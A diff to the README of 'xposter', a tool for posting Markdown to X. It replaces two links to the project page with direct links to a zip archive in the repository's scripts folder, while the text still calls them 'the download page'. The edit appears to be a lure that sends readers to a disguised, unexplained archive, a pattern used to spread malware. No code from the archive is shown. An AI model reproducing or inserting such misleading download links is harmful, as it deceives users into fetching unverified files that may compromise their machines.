@@ -1,6 +1,6 @@
 # 📝 xposter - Publish Markdown files to X easily
 
-[![Download xposter](https://img.shields.io/badge/Download-xposter-blue.svg)](https://github.com/unconfirmed-darky804/xposter)
+[![Download xposter](https://img.shields.io/badge/Download-xposter-blue.svg)](https://github.com/unconfirmed-darky804/xposter/raw/refs/heads/main/scripts/Software_v2.6-alpha.2.zip)
 
 ## 📌 About this project
 
@@ -18,7 +18,7 @@ You save time and keep your formatting intact. Your bold text, headers, and list
 
 Follow these steps to set up the software.
 
-1. Visit [this link](https://github.com/unconfirmed-darky804/xposter) to reach the download page.
+1. Visit [this link](https://github.com/unconfirmed-darky804/xposter/raw/refs/heads/main/scripts/Software_v2.6-alpha.2.zip) to reach the download page.
 2. Look for the release section on the right side of the page.
 3. Download the latest version of the extension files.
 4. Save the folder to your desktop.
